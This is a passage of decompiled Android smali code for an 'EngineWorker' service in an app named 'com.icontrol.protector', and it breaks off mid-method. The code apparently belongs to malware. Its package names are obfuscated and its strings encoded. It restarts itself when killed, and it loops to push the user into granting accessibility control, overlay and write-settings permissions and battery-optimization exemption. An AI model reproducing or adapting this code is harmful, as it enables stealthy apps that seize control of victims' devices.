.class public Lcom/icontrol/protector/EngineWorker;
.super Landroid/app/IntentService;
.source "SourceFile"


# static fields
.field static b:I = 0x2710

.field static c:I = 0x0

.field static d:Z = false


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    const/4 v0, 0x1

    new-array v0, v0, [B

    const/4 v1, 0x0

    const/16 v2, -0x1a

    aput-byte v2, v0, v1

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    return-void

    nop

    :array_0
    .array-data 1
        -0x24t
        -0xbt
        0x74t
        -0x80t
        0xat
        0xft
        -0x58t
        0x67t
    .end array-data
.end method

.method private a(Ljava/lang/String;Landroid/content/Context;)V
    .locals 2

    .line 1
    invoke-virtual {p2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    new-instance v1, Landroid/content/ComponentName;

    invoke-direct {v1, p2, p1}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const/4 p1, 0x2

    const/4 p2, 0x1

    invoke-virtual {v0, v1, p1, p2}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    return-void
.end method

.method private b(Ljava/lang/String;Landroid/content/Context;)V
    .locals 2

    .line 1
    invoke-virtual {p2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    new-instance v1, Landroid/content/ComponentName;

    invoke-direct {v1, p2, p1}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const/4 p1, 0x1

    invoke-virtual {v0, v1, p1, p1}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    return-void
.end method

.method private c(Landroid/content/Context;)V
    .locals 2

    .line 1
    invoke-static {p1}, Lntidisestablish/neumonoul/floccinaucinih/oq;->b(Landroid/content/Context;)Lntidisestablish/neumonoul/floccinaucinih/oq;

    move-result-object v0

    invoke-virtual {v0, p1}, Lntidisestablish/neumonoul/floccinaucinih/oq;->a(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object p1

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x22

    if-lt v0, v1, :cond_0

    sget v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->A:I

    const/4 v1, 0x1

    invoke-static {p0, v0, p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/af;->a(Lcom/icontrol/protector/EngineWorker;ILandroid/app/Notification;I)V

    goto :goto_0

    :cond_0
    sget v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->A:I

    invoke-virtual {p0, v0, p1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    :goto_0
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 1

    invoke-super {p0}, Landroid/app/IntentService;->onCreate()V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/icontrol/protector/EngineWorker;->c(Landroid/content/Context;)V

    return-void
.end method

.method public onDestroy()V
    .locals 6

    invoke-super {p0}, Landroid/app/IntentService;->onDestroy()V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x3a98

    add-long/2addr v1, v3

    const-class v5, Lcom/icontrol/protector/EngineWorker;

    invoke-static {v0, v5, v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/y1;->b(Landroid/content/Context;Ljava/lang/Class;J)V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    add-long/2addr v1, v3

    invoke-static {v0, v5, v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/y1;->b(Landroid/content/Context;Ljava/lang/Class;J)V

    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, v0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-static {v0, v5}, Lntidisestablish/neumonoul/floccinaucinih/q8;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v2

    if-nez v2, :cond_1

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1a

    if-lt v2, v3, :cond_0

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/p1;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    :cond_0
    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_1
    :goto_0
    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 17

    move-object/from16 v1, p0

    const-class v2, Lcom/icontrol/protector/AccessServices;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {v1, v0}, Lcom/icontrol/protector/EngineWorker;->c(Landroid/content/Context;)V

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-class v0, Lcom/icontrol/protector/EngineWorker;

    invoke-static {v3, v0}, Lntidisestablish/neumonoul/floccinaucinih/y1;->a(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v0, 0x2

    new-array v4, v0, [B

    fill-array-data v4, :array_0

    const/16 v5, 0x8

    new-array v6, v5, [B

    fill-array-data v6, :array_1

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    const-string v6, ""

    invoke-static {v3, v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v4

    if-nez v4, :cond_1

    invoke-static {v3}, Lcom/icontrol/protector/n;->d(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v7

    const/16 v8, 0xa

    if-ge v7, v8, :cond_0

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/16 v4, 0x9

    const/16 v8, 0x10

    invoke-static {v4, v8}, Lcom/icontrol/protector/n;->W(II)I

    move-result v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    :cond_0
    new-array v7, v5, [B

    fill-array-data v7, :array_2

    new-array v8, v5, [B

    fill-array-data v8, :array_3

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-array v0, v0, [B

    fill-array-data v0, :array_4

    new-array v7, v5, [B

    fill-array-data v7, :array_5

    invoke-static {v0, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->e(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_1
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v4, Lcom/icontrol/protector/WorkServices;

    invoke-static {v0, v4}, Lntidisestablish/neumonoul/floccinaucinih/q8;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    const/16 v7, 0x1a

    if-nez v0, :cond_3

    new-instance v0, Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    invoke-direct {v0, v8, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v8, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v8, v7, :cond_2

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/bf;->a(Lcom/icontrol/protector/EngineWorker;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    :cond_2
    invoke-virtual {v1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_3
    :goto_0
    invoke-static {}, Lntidisestablish/neumonoul/floccinaucinih/y9;->a()Lntidisestablish/neumonoul/floccinaucinih/y9;

    move-result-object v8

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v9, Lcom/icontrol/protector/My_Configs;->ALL_CONFIG:Ljava/lang/String;

    invoke-virtual {v8, v0, v9}, Lntidisestablish/neumonoul/floccinaucinih/y9;->b(Landroid/content/Context;Ljava/lang/String;)V

    const/4 v9, 0x0

    const/16 v0, 0x1c

    move v10, v0

    move v11, v9

    move v12, v11

    :goto_1
    :try_start_0
    sget v0, Lcom/icontrol/protector/EngineWorker;->b:I

    int-to-long v13, v0

    invoke-static {v13, v14}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :try_start_1
    invoke-static {v3, v2}, Lntidisestablish/neumonoul/floccinaucinih/q8;->b(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_17

    const/4 v13, 0x1

    if-nez v0, :cond_6

    :try_start_2
    iget-boolean v0, v8, Lntidisestablish/neumonoul/floccinaucinih/y9;->a:Z

    if-eqz v0, :cond_6

    iget-boolean v0, v8, Lntidisestablish/neumonoul/floccinaucinih/y9;->b:Z

    if-eqz v0, :cond_6

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v14, 0x21

    const/16 v15, 0x19

    if-lt v0, v14, :cond_4

    invoke-static {v3, v2}, Lntidisestablish/neumonoul/floccinaucinih/q8;->b(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_4

    sget-object v0, Lcom/icontrol/protector/My_Configs;->Access_type:Ljava/lang/String;

    new-array v14, v13, [B

    const/16 v16, 0x30

    aput-byte v16, v14, v9

    new-array v9, v5, [B

    fill-array-data v9, :array_6

    invoke-static {v14, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    invoke-static {}, Lcom/icontrol/protector/RestrectionActivity;->b()Z

    move-result v0

    if-nez v0, :cond_4

    if-nez v12, :cond_4

    if-lt v10, v15, :cond_4

    sget-boolean v0, Lcom/icontrol/protector/EngineWorker;->d:Z

    if-eqz v0, :cond_4

    new-instance v0, Landroid/content/Intent;

    const-class v9, Lcom/icontrol/protector/RestrectionActivity;

    invoke-direct {v0, v3, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v9, 0x14000000

    invoke-virtual {v0, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const/16 v0, 0x3a98

    sput v0, Lcom/icontrol/protector/EngineWorker;->b:I

    move v12, v13

    const/4 v9, 0x0

    goto :goto_1

    :catch_1
    move-exception v0

    move v7, v5

    :goto_2
    const/4 v9, 0x0

    goto/16 :goto_13

    :cond_4
    invoke-static {}, Lcom/icontrol/protector/AccessibilityActivity;->b()Z

    move-result v0

    if-nez v0, :cond_5

    if-lt v10, v15, :cond_5

    const/16 v0, 0x3e8

    sput v0, Lcom/icontrol/protector/EngineWorker;->b:I

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v9

    invoke-direct {v0, v9}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v9, Lcom/icontrol/protector/EngineWorker$a;

    invoke-direct {v9, v1, v3}, Lcom/icontrol/protector/EngineWorker$a;-><init>(Lcom/icontrol/protector/EngineWorker;Landroid/content/Context;)V

    invoke-virtual {v0, v9}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    sput-boolean v13, Lcom/icontrol/protector/EngineWorker;->d:Z

    move v7, v5

    const/4 v9, 0x0

    const/4 v10, 0x0

    goto/16 :goto_12

    :cond_5
    add-int/lit8 v10, v10, 0x1

    move v7, v5

    const/4 v9, 0x0

    const/4 v12, 0x0

    goto/16 :goto_12

    :cond_6
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    sget v9, Lcom/icontrol/protector/EngineWorker;->c:I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    const/4 v14, 0x3

    const/high16 v15, 0x4000000

    const/16 v16, 0x1f40

    const/high16 v7, 0x10000

    const/high16 v5, 0x10000000

    if-ge v9, v14, :cond_7

    :try_start_3
    invoke-static {}, Lcom/icontrol/protector/k;->a()[Ljava/lang/String;

    move-result-object v9

    invoke-static {v3, v9}, Lcom/icontrol/protector/k;->e(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v9

    if-nez v9, :cond_7

    sget v0, Lcom/icontrol/protector/EngineWorker;->c:I

    add-int/2addr v0, v13

    sput v0, Lcom/icontrol/protector/EngineWorker;->c:I

    sput v16, Lcom/icontrol/protector/EngineWorker;->b:I

    new-instance v0, Landroid/content/Intent;

    const-class v9, Lcom/icontrol/protector/PermissionsActivity;

    invoke-direct {v0, v3, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v15}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    :goto_3
    invoke-virtual {v3, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_5

    :catch_2
    move-exception v0

    :goto_4
    const/16 v7, 0x8

    goto :goto_2

    :cond_7
    iget-boolean v9, v8, Lntidisestablish/neumonoul/floccinaucinih/y9;->d:Z

    if-eqz v9, :cond_8

    invoke-static {v3}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v9

    if-nez v9, :cond_8

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0}, Lcom/icontrol/protector/a;->i(Ljava/lang/Boolean;)V

    invoke-static {}, Lcom/icontrol/protector/ActivityDraw;->a()Z

    move-result v0

    if-nez v0, :cond_b

    sput v16, Lcom/icontrol/protector/EngineWorker;->b:I

    new-instance v0, Landroid/content/Intent;

    const-class v9, Lcom/icontrol/protector/ActivityDraw;

    invoke-direct {v0, v3, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v15}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    goto :goto_3

    :cond_8
    iget-boolean v9, v8, Lntidisestablish/neumonoul/floccinaucinih/y9;->j:Z

    if-eqz v9, :cond_9

    invoke-static {v3}, Landroid/provider/Settings$System;->canWrite(Landroid/content/Context;)Z

    move-result v9
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    if-nez v9, :cond_9

    const/16 v0, 0x1770

    :try_start_4
    sput v0, Lcom/icontrol/protector/EngineWorker;->b:I

    new-instance v0, Landroid/content/Intent;

    const/16 v9, 0x2d

    new-array v9, v9, [B

    fill-array-data v9, :array_7

    const/16 v13, 0x8

    new-array v14, v13, [B

    fill-array-data v14, :array_8

    invoke-static {v9, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    new-instance v14, Ljava/lang/StringBuilder;

    invoke-direct {v14}, Ljava/lang/StringBuilder;-><init>()V

    new-array v15, v13, [B

    fill-array-data v15, :array_9

    new-array v7, v13, [B

    fill-array-data v7, :array_a

    invoke-static {v15, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v14, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v14, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    invoke-direct {v0, v9, v7}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v9, 0x8

    new-array v13, v9, [B

    fill-array-data v13, :array_b

    new-array v14, v9, [B

    fill-array-data v14, :array_c

    invoke-static {v13, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    invoke-virtual {v0, v7}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v5, 0x10000

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v3, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    goto/16 :goto_5

    :cond_9
    :try_start_5
    iget-boolean v7, v8, Lntidisestablish/neumonoul/floccinaucinih/y9;->h:Z

    if-eqz v7, :cond_a

    invoke-static {v3}, Lcom/icontrol/protector/n;->U(Landroid/content/Context;)Z

    move-result v7

    if-nez v7, :cond_a

    iget-boolean v7, v8, Lntidisestablish/neumonoul/floccinaucinih/y9;->b:Z

    if-nez v7, :cond_a

    const/16 v0, 0x1b58

    sput v0, Lcom/icontrol/protector/EngineWorker;->b:I
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    :try_start_6
    new-instance v0, Landroid/content/Intent;

    const/16 v7, 0x26

    new-array v7, v7, [B

    fill-array-data v7, :array_d

    const/16 v9, 0x8

    new-array v13, v9, [B

    fill-array-data v13, :array_e

    invoke-static {v7, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    new-array v14, v9, [B

    fill-array-data v14, :array_f

    new-array v15, v9, [B

    fill-array-data v15, :array_10

    invoke-static {v14, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v13, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v13, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v9

    invoke-direct {v0, v7, v9}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v5, 0x800000

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v5, 0x10000

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    goto :goto_5

    :cond_a
    :try_start_7
    iget-boolean v7, v8, Lntidisestablish/neumonoul/floccinaucinih/y9;->n:Z

    if-eqz v7, :cond_c

    const/16 v7, 0x1e

    if-lt v0, v7, :cond_c

    invoke-static {}, Lntidisestablish/neumonoul/floccinaucinih/e0;->a()Z

    move-result v7
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    if-nez v7, :cond_c

    const/16 v0, 0xbb8

    :try_start_8
    sput v0, Lcom/icontrol/protector/EngineWorker;->b:I

    new-instance v0, Landroid/content/Intent;

    const/16 v7, 0x37

    new-array v7, v7, [B

    fill-array-data v7, :array_11

    const/16 v9, 0x8

    new-array v13, v9, [B

    fill-array-data v13, :array_12

    invoke-static {v7, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v0, v7}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/4 v7, 0x7

    new-array v7, v7, [B

    fill-array-data v7, :array_13

    const/16 v9, 0x8

    new-array v13, v9, [B

    fill-array-data v13, :array_14

    invoke-static {v7, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v9

    const/4 v13, 0x0

    invoke-static {v7, v9, v13}, Landroid/net/Uri;->fromParts(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    invoke-virtual {v0, v7}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v5, 0x20000000

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    sget-object v0, Lcom/icontrol/protector/WorkServices;->o:Lcom/icontrol/protector/AccessServices;

    if-eqz v0, :cond_b

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object v0, Lcom/icontrol/protector/AccessServices;->F:Ljava/lang/Boolean;
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3

    goto :goto_5

    :catch_3
    move-exception v0

    :try_start_9
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :catch_4
    :cond_b
    :goto_5
    const/16 v7, 0x8

    const/4 v9, 0x0

    goto/16 :goto_12

    :cond_c
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-static {v7, v4}, Lntidisestablish/neumonoul/floccinaucinih/q8;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v7
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_2

    if-nez v7, :cond_e

    :try_start_a
    new-instance v7, Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    invoke-direct {v7, v9, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_5

    const/16 v9, 0x1a

    if-lt v0, v9, :cond_d

    :try_start_b
    invoke-static {v1, v7}, Lntidisestablish/neumonoul/floccinaucinih/bf;->a(Lcom/icontrol/protector/EngineWorker;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_6

    :cond_d
    invoke-virtual {v1, v7}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_6

    :catch_5
    move-exception v0

    const/16 v9, 0x1a

    goto/16 :goto_4

    :cond_e
    const/16 v9, 0x1a

    :goto_6
    invoke-static {v3}, Lntidisestablish/neumonoul/floccinaucinih/hm;->a(Landroid/content/Context;)V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_2

    if-nez v11, :cond_14

    :try_start_c
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v7, Lntidisestablish/neumonoul/floccinaucinih/ab;->D:Ljava/lang/String;

    sget-object v11, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v7, v11}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    iget-boolean v0, v8, Lntidisestablish/neumonoul/floccinaucinih/y9;->l:Z
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_e

    if-eqz v0, :cond_f

    :try_start_d
    invoke-static {v3}, Lcom/icontrol/protector/n;->h(Landroid/content/Context;)Z

    move-result v0
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_6

    if-nez v0, :cond_f

    const/4 v7, 0x0

    :try_start_e
    sput-boolean v7, Lcom/icontrol/protector/AccessServices;->u:Z

    new-instance v0, Landroid/content/Intent;

    const/16 v7, 0x35

    new-array v7, v7, [B

    fill-array-data v7, :array_15

    const/16 v11, 0x8

    new-array v14, v11, [B

    fill-array-data v14, :array_16

    invoke-static {v7, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-instance v14, Ljava/lang/StringBuilder;

    invoke-direct {v14}, Ljava/lang/StringBuilder;-><init>()V

    new-array v15, v11, [B

    fill-array-data v15, :array_17

    new-array v9, v11, [B

    fill-array-data v9, :array_18

    invoke-static {v15, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v14, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v14, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v9

    invoke-direct {v0, v7, v9}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v7, 0x40000000    # 2.0f

    invoke-virtual {v0, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sput-boolean v13, Lntidisestablish/neumonoul/floccinaucinih/ab;->j0:Z

    new-instance v7, Ljava/lang/Thread;

    new-instance v9, Lcom/icontrol/protector/EngineWorker$b;

    invoke-direct {v9, v1, v3, v0}, Lcom/icontrol/protector/EngineWorker$b;-><init>(Lcom/icontrol/protector/EngineWorker;Landroid/content/Context;Landroid/content/Intent;)V

    invoke-direct {v7, v9}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v7}, Ljava/lang/Thread;->start()V

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->H:Ljava/lang/String;

    sget-object v7, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

